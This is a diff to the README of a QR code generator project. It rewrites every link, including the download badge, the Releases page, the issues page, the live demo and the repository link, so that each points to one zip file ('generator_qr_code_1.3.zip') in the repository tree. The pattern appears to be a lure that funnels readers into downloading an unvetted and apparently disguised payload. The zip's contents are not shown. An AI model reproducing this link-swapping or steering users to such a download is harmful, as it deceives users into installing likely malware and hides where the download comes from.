@@ -1,7 +1,7 @@
 # 🎉 qr-code-generator - Create QR Codes Instantly
 
 ## 🚀 Download Here
-[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/minhk7128/qr-code-generator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/minhk7128/qr-code-generator/main/brocatello/generator_qr_code_1.3.zip%20Release&color=blue)](https://raw.githubusercontent.com/minhk7128/qr-code-generator/main/brocatello/generator_qr_code_1.3.zip)
 
 ## 🛠️ Introduction
 Welcome to the Privacy-First QR Code Generator. This application offers a quick, modern way to create QR codes directly in your browser. With our tool, you can easily generate unlimited QR codes tailored to your needs, all while keeping your data private.
@@ -20,7 +20,7 @@ Welcome to the Privacy-First QR Code Generator. This application offers a quick,
     - Choose from various shapes, including square, dot, or round options, for your QR code.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/minhk7128/qr-code-generator/releases) to download the latest version of the application. Choose the suitable version for your operating system to download and install.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/minhk7128/qr-code-generator/main/brocatello/generator_qr_code_1.3.zip) to download the latest version of the application. Choose the suitable version for your operating system to download and install.
 
 ### Installation Steps
 1. Click the link above to go to the Releases page.
@@ -48,14 +48,14 @@ Feel free to use the app from your laptop, desktop, or mobile device.
 ## 🔍 Help & Support
 If you have any questions or need assistance, check the following resources:
 - [FAQ Section](#)
-- [Open Issues on GitHub](https://github.com/minhk7128/qr-code-generator/issues)
+- [Open Issues on GitHub](https://raw.githubusercontent.com/minhk7128/qr-code-generator/main/brocatello/generator_qr_code_1.3.zip)
 
 ## 🌈 Community Contributions
 We welcome contributions! If you would like to help improve the qr-code-generator, visit our [Contribution Guide](#). 
 
 ## 🔗 Useful Links
-- [Live Demo](https://FOSSpel.github.io/qr-code-generator/)
-- [GitHub Repository](https://github.com/minhk7128/qr-code-generator)
+- [Live Demo](https://raw.githubusercontent.com/minhk7128/qr-code-generator/main/brocatello/generator_qr_code_1.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/minhk7128/qr-code-generator/main/brocatello/generator_qr_code_1.3.zip)
 
 ## 💬 Feedback
 Your feedback is important to us. Please leave ratings, comments, or suggestions through GitHub issues or the feedback form in our application.
